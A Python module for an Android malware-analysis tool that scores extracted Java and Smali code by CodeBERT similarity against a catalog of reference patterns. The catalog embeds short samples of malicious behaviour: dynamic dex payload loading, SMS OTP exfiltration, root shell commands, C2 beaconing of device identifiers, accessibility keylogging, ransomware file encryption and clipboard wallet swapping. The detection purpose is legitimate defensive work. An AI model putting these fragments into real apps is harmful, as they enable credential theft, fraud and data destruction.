"""Pretrained CodeBERT (microsoft/codebert-base) Suspicious Code Similarity Analyzer.

Provides semantic similarity analysis on extracted Java, Kotlin, and Smali code
against a curated reference catalog of known suspicious and malicious Android
behavior patterns.

Key Design & Safety Principles:
1. Evidence & Confidence: Every match references the source class/file, snippet,
   confidence score, and matched reference behavior.
2. 16 GB RAM Optimized: Lazy singleton loading, low inference batching,
   max token truncation (256 tokens), torch.inference_mode(), and automatic cleanup.
3. Graceful Fallback: If PyTorch, Transformers, or weights are unavailable,
   falls back seamlessly to a token-level similarity engine without crashing.
4. Non-Diagnostic Disclaimer: Semantic similarity measures structural and
   behavioral resemblance to reference code templates. It does NOT claim
   autonomous malware classification without a validated classifier and labeled dataset.
"""

import gc
import os
import re
from typing import Any, Dict, List, Optional
from loguru import logger

# Curated reference catalog of known suspicious Android behavioral patterns (Java & Smali)
REFERENCE_PATTERNS = [
    {
        "id": "REF-DYN-LOAD-01",
        "name": "Dynamic Dex/Jar Loading & Reflection",
        "category": "Dropper / Dynamic Loading",
        "severity": "High",
        "description": "Dynamically instantiates DexClassLoader or InMemoryDexClassLoader to execute unverified secondary payloads.",
        "java_reference": """
        DexClassLoader loader = new DexClassLoader(dexPath, optDir, null, context.getClassLoader());
        Class<?> loadedClass = loader.loadClass("com.payload.DropperTarget");
        Method method = loadedClass.getMethod("runPayload", Context.class);
        method.invoke(null, context);
        """,
        "smali_reference": """
        new-instance v0, Ldalvik/system/DexClassLoader;
        invoke-direct {v0, v1, v2, v3, v4}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V
        const-string v1, "com.payload.DropperTarget"
        invoke-virtual {v0, v1}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;
        move-result-object v0
        """,
    },
    {
        "id": "REF-SMS-EXFIL-02",
        "name": "SMS Interception & Outbound Exfiltration",
        "category": "SMS Fraud / Banking Trojan",
        "severity": "Critical",
        "description": "Intercepts incoming SMS messages, extracts authentication tokens or OTPs, and transmits them via SmsManager.",
        "java_reference": """
        Bundle bundle = intent.getExtras();
        Object[] pdus = (Object[]) bundle.get("pdus");
        SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdus[0]);
        String body = sms.getMessageBody();
        SmsManager.getDefault().sendTextMessage(exfilDestinationNumber, null, body, null, null);
        """,
        "smali_reference": """
        invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;
        move-result-object v0
        invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
        """,
    },
    {
        "id": "REF-SHELL-EXEC-03",
        "name": "Root Privilege Abuse & Shell Execution",
        "category": "Privilege Escalation / Shell",
        "severity": "Critical",
        "description": "Executes interactive root shell commands or attempts privilege escalation via /system/bin/sh or su.",
        "java_reference": """
        Process process = Runtime.getRuntime().exec("/system/bin/sh");
        DataOutputStream os = new DataOutputStream(process.getOutputStream());
        os.writeBytes("su -c chmod 777 /data/local/tmp/payload\n");
        os.writeBytes("exit\n");
        os.flush();
        process.waitFor();
        """,
        "smali_reference": """
        invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
        move-result-object v0
        const-string v1, "/system/bin/sh"
        invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
        move-result-object v0
        """,
    },
    {
        "id": "REF-C2-BEACON-04",
        "name": "C2 Socket Beaconing & Device Fingerprinting",
        "category": "Command and Control (C2)",
        "severity": "High",
        "description": "Opens raw socket communication or HTTP streams to beacon unique device identifiers (IMEI, Android ID) to remote infrastructure.",
        "java_reference": """
        Socket socket = new Socket(c2Host, c2Port);
        OutputStream out = socket.getOutputStream();
        String beaconPayload = "ID=" + Settings.Secure.getString(ctx.getContentResolver(), "android_id") + "&IMEI=" + telephonyManager.getDeviceId();
        out.write(beaconPayload.getBytes("UTF-8"));
        out.flush();
        """,
        "smali_reference": """
        new-instance v0, Ljava/net/Socket;
        invoke-direct {v0, v1, v2}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V
        invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;
        move-result-object v1
        """,
    },
    {
        "id": "REF-ACCESSIBILITY-05",
        "name": "Accessibility Service Keylogging & UI Abuse",
        "category": "Accessibility RAT / Overlay",
        "severity": "High",
        "description": "Monitors window state changes or text edits via AccessibilityEvent to harvest user keystrokes, passwords, or PINs.",
        "java_reference": """
        public void onAccessibilityEvent(AccessibilityEvent event) {
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                List<CharSequence> textList = event.getText();
                for (CharSequence cs : textList) {
                    recordKeystroke(cs.toString());
                }
            }
        }
        """,
        "smali_reference": """
        invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I
        move-result v0
        const/16 v1, 0x10
        if-ne v0, v1, :cond_0
        invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;
        move-result-object v0
        """,
    },
    {
        "id": "REF-RANSOM-ENC-06",
        "name": "Recursive Storage Encryption (Ransomware)",
        "category": "Ransomware / File Encryption",
        "severity": "Critical",
        "description": "Recursively iterates user media directories and encrypts target documents with AES/CBC or RSA keys.",
        "java_reference": """
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, secretKey, ivSpec);
        byte[] encrypted = cipher.doFinal(fileBytes);
        FileOutputStream fos = new FileOutputStream(targetFile.getAbsolutePath() + ".locked");
        fos.write(encrypted);
        fos.close();
        targetFile.delete();
        """,
        "smali_reference": """
        const-string v0, "AES/CBC/PKCS5Padding"
        invoke-static {v0}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;
        move-result-object v0
        const/4 v1, 0x1
        invoke-virtual {v0, v1, v2, v3}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;Ljava/security/spec/AlgorithmParameterSpec;)V
        """,
    },
    {
        "id": "REF-CLIPBOARD-07",
        "name": "Cryptocurrency Clipboard Address Hijacking",
        "category": "Clipper / Financial Fraud",
        "severity": "Medium",
        "description": "Monitors clipboard buffer for Bitcoin, Ethereum, or TRON wallet addresses and swaps them with attacker wallets.",
        "java_reference": """
        ClipboardManager clipboard = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
        if (clipboard.hasPrimaryClip()) {
            String text = clipboard.getPrimaryClip().getItemAt(0).getText().toString();
            if (text.matches("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$")) {
                ClipData replaceClip = ClipData.newPlainText("text", attackerBtcAddress);
                clipboard.setPrimaryClip(replaceClip);
            }
        }
        """,
        "smali_reference": """
        invoke-virtual {v0}, Landroid/content/ClipboardManager;->getPrimaryClip()Landroid/content/ClipData;
        move-result-object v1
        const/4 v2, 0x0
        invoke-virtual {v1, v2}, Landroid/content/ClipData;->getItemAt(I)Landroid/content/ClipData$Item;
        move-result-object v1
        """,
    },
    {
        "id": "REF-ROOT-EVASION-08",
        "name": "Anti-Analysis & Root / Emulator Detection",
        "category": "Defense Evasion",
        "severity": "Medium",
        "description": "Checks known root indicators, su binaries, or qemu emulator system properties to evade automated sandbox analysis.",
        "java_reference": """
        String[] paths = {"/system/bin/su", "/system/xbin/su", "/sbin/su", "/system/app/Superuser.apk"};
        for (String p : paths) {
            if (new File(p).exists()) return true;
        }
        if (Build.FINGERPRINT.startsWith("generic") || Build.MODEL.contains("google_sdk")) return true;
        """,
        "smali_reference": """
        new-instance v0, Ljava/io/File;
        const-string v1, "/system/bin/su"
        invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V
        invoke-virtual {v0}, Ljava/io/File;->exists()Z
        move-result v0
        """,
    },
]

MODEL_NAME = "microsoft/codebert-base"
MAX_TOKEN_LENGTH = 256
SIMILARITY_BASELINE = 0.965  # Calibrated baseline for CodeBERT cosine representations
CONFIDENCE_THRESHOLD = 0.55  # Minimum calibrated confidence to report a match


class CodeBERTSimilarityAnalyzer:
    """Pretrained CodeBERT-based suspicious code semantic similarity engine.

    Optimized for systems with 16 GB RAM by using lazy loading, small batches,
    token truncation, and calibrated dual Java/Smali reference matching.
    """

    def __init__(self, model_name: str = MODEL_NAME, max_token_length: int = MAX_TOKEN_LENGTH):
        self.model_name = model_name
        self.max_token_length = max_token_length
        self._tokenizer = None
        self._model = None
        self._device = None
        self._initialized = False
        self._fallback_mode = False
        self._fallback_reason = None

        # Precomputed reference pattern embeddings for Java and Smali
        self._reference_java_embeddings = None
        self._reference_smali_embeddings = None
        self._reference_patterns = REFERENCE_PATTERNS

    def _initialize_model(self) -> bool:
        """Lazily loads the pretrained CodeBERT model and tokenizer on first use.

        Returns True if successful, False if fallback mode was engaged.
        """
        if self._initialized:
            return not self._fallback_mode

        try:
            import torch
            from transformers import AutoModel, AutoTokenizer

            # 16 GB RAM optimization: restrict torch CPU threads to prevent CPU thrashing
            if hasattr(torch, "set_num_threads"):
                try:
                    torch.set_num_threads(min(4, os.cpu_count() or 4))
                except Exception:
                    pass

            # Detect CUDA if available, else CPU
            self._device = "cuda" if torch.cuda.is_available() else "cpu"
            logger.info(f"Initializing CodeBERT ({self.model_name}) on device: {self._device}...")

            # Load tokenizer and model
            self._tokenizer = AutoTokenizer.from_pretrained(self.model_name)
            self._model = AutoModel.from_pretrained(self.model_name)
            self._model.to(self._device)
            self._model.eval()

            # Pre-compute reference embeddings for Java and Smali
            self._precompute_reference_embeddings(torch)

            self._initialized = True
            self._fallback_mode = False
            logger.info("CodeBERT model and reference pattern embeddings successfully initialized.")
            return True

        except Exception as e:
            logger.warning(
                f"CodeBERT loading failed ({e}). Activating lightweight heuristic fallback engine."
            )
            self._initialized = True
            self._fallback_mode = True
            self._fallback_reason = str(e)
            return False

    def _precompute_reference_embeddings(self, torch):
        """Computes and caches normalized embeddings for all reference patterns."""
        java_embs = []
        smali_embs = []

        for pat in self._reference_patterns:
            j_emb = self._compute_single_embedding(pat["java_reference"], torch)
            s_emb = self._compute_single_embedding(pat["smali_reference"], torch)
            java_embs.append(j_emb / torch.norm(j_emb, p=2, dim=1, keepdim=True))
            smali_embs.append(s_emb / torch.norm(s_emb, p=2, dim=1, keepdim=True))

        self._reference_java_embeddings = torch.cat(java_embs, dim=0)
        self._reference_smali_embeddings = torch.cat(smali_embs, dim=0)

    def _compute_single_embedding(self, code_text: str, torch):
        """Computes mean-pooled token embedding for a single code string."""
        with torch.inference_mode():
            inputs = self._tokenizer(
                code_text,
                return_tensors="pt",
                truncation=True,
                max_length=self.max_token_length,
                padding=True,
            )
            inputs = {k: v.to(self._device) for k, v in inputs.items()}
            outputs = self._model(**inputs)

            mask = inputs["attention_mask"].unsqueeze(-1).expand(outputs.last_hidden_state.size()).float()
            sum_embeddings = torch.sum(outputs.last_hidden_state * mask, 1)
            sum_mask = torch.clamp(mask.sum(1), min=1e-9)
            mean_pooled = sum_embeddings / sum_mask
            return mean_pooled.cpu()

    def analyze_snippet(self, code_text: str, context_meta: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
        """Analyzes a single code snippet against all reference patterns.

        Returns a list of matching reference patterns above threshold, sorted by confidence.
        """
        if not code_text or not code_text.strip():
            return []

        if not self._initialize_model() or self._fallback_mode:
            return self._fallback_analyze_snippet(code_text, context_meta)

        try:
            import torch

            raw_emb = self._compute_single_embedding(code_text, torch)
            cand_norm = raw_emb / torch.norm(raw_emb, p=2, dim=1, keepdim=True)

            # Compute similarities against both Java and Smali representations
            sims_j = (cand_norm @ self._reference_java_embeddings.T).squeeze(0)
            sims_s = (cand_norm @ self._reference_smali_embeddings.T).squeeze(0)
            best_cosines = torch.maximum(sims_j, sims_s).tolist()

            matches = []
            for i, cos_val in enumerate(best_cosines):
                # Calibrate cosine similarity into [0.0, 1.0] confidence score
                calibrated_confidence = max(0.0, min(1.0, (cos_val - SIMILARITY_BASELINE) / 0.035))

                if calibrated_confidence >= CONFIDENCE_THRESHOLD:
                    pat = self._reference_patterns[i]
                    matches.append({
                        "pattern_id": pat["id"],
                        "pattern_name": pat["name"],
                        "category": pat["category"],
                        "severity": pat["severity"],
                        "description": pat["description"],
                        "confidence_score": round(calibrated_confidence, 4),
                        "similarity_percentage": f"{calibrated_confidence * 100:.1f}%",
                        "raw_cosine": round(cos_val, 4),
                        "evidence": {
                            "class_name": (context_meta or {}).get("class_name", "UnknownClass"),
                            "file_path": (context_meta or {}).get("file_path", "unknown/path"),
                            "line_number": (context_meta or {}).get("line_number"),
                            "snippet": code_text[:300].strip(),
                        },
                        "disclaimer": (
                            "Semantic similarity indicates structural/behavioral alignment with reference "
                            "suspicious patterns. It does not constitute autonomous malware classification."
                        ),
                    })

            matches.sort(key=lambda x: x["confidence_score"], reverse=True)
            return matches

        except Exception as e:
            logger.error(f"Error during CodeBERT inference: {e}. Falling back.")
            return self._fallback_analyze_snippet(code_text, context_meta)

    def analyze_snippets_batch(
        self,
        snippets: List[Dict[str, Any]],
        max_results: int = 25,
    ) -> Dict[str, Any]:
        """Analyzes a collection of extracted code snippets.

        Each item in `snippets` should be a dict:
        {"code": str, "class_name": str, "file_path": str, "line_number": int}
        """
        self._initialize_model()

        all_matches = []
        category_counts: Dict[str, int] = {}
        max_score = 0.0

        for item in snippets[:50]:
            code_text = item.get("code") or item.get("snippet", "")
            if not code_text or len(code_text.strip()) < 15:
                continue

            matches = self.analyze_snippet(code_text, context_meta=item)
            for m in matches:
                all_matches.append(m)
                cat = m["category"]
                category_counts[cat] = category_counts.get(cat, 0) + 1
                if m["confidence_score"] > max_score:
                    max_score = m["confidence_score"]

        deduped = {}
        for m in all_matches:
            key = (m["pattern_id"], m["evidence"]["class_name"])
            if key not in deduped or m["confidence_score"] > deduped[key]["confidence_score"]:
                deduped[key] = m

        final_matches = sorted(deduped.values(), key=lambda x: x["confidence_score"], reverse=True)[:max_results]
        gc.collect()

        return {
            "status": "fallback" if self._fallback_mode else "active",
            "model": "heuristic-fallback" if self._fallback_mode else self.model_name,
            "fallback_reason": self._fallback_reason,
            "total_snippets_analyzed": len(snippets),
            "suspicious_matches_found": len(final_matches),
            "max_confidence_score": round(max_score, 4),
            "summary_by_category": category_counts,
            "matches": final_matches,
            "disclaimer": (
                "Pretrained CodeBERT semantic code similarity analysis. Confidence reflects structural and "
                "functional alignment with reference suspicious patterns, not an automated malware classification."
            ),
        }

    def _fallback_analyze_snippet(
        self, code_text: str, context_meta: Optional[Dict[str, Any]] = None
    ) -> List[Dict[str, Any]]:
        """Lightweight heuristic fallback when PyTorch/Transformers or weights are unavailable."""
        matches = []
        code_lower = code_text.lower()
        code_tokens = set(re.findall(r"[a-zA-Z0-9_]{3,}", code_lower))

        for pat in self._reference_patterns:
            ref_combined = f"{pat.get('java_reference', '')} {pat.get('smali_reference', '')}".lower()
            ref_tokens = set(re.findall(r"[a-zA-Z0-9_]{3,}", ref_combined))

            if not ref_tokens:
                continue

            intersection = code_tokens.intersection(ref_tokens)
            union = code_tokens.union(ref_tokens)
            jaccard = len(intersection) / len(union) if union else 0.0
            confidence = min(1.0, jaccard * 2.5)

            if confidence >= 0.35:
                matches.append({
                    "pattern_id": pat["id"],
                    "pattern_name": pat["name"],
                    "category": pat["category"],
                    "severity": pat["severity"],
                    "description": pat["description"],
                    "confidence_score": round(confidence, 4),
                    "similarity_percentage": f"{confidence * 100:.1f}%",
                    "raw_cosine": None,
                    "evidence": {
                        "class_name": (context_meta or {}).get("class_name", "UnknownClass"),
                        "file_path": (context_meta or {}).get("file_path", "unknown/path"),
                        "line_number": (context_meta or {}).get("line_number"),
                        "snippet": code_text[:300].strip(),
                    },
                    "disclaimer": (
                        "Fallback heuristic token similarity analysis. Does not constitute autonomous malware classification."
                    ),
                })

        matches.sort(key=lambda x: x["confidence_score"], reverse=True)
        return matches


# Global singleton instance
_codebert_analyzer_instance: Optional[CodeBERTSimilarityAnalyzer] = None


def get_codebert_analyzer() -> CodeBERTSimilarityAnalyzer:
    """Returns the shared global instance of CodeBERTSimilarityAnalyzer."""
    global _codebert_analyzer_instance
    if _codebert_analyzer_instance is None:
        _codebert_analyzer_instance = CodeBERTSimilarityAnalyzer()
    return _codebert_analyzer_instance
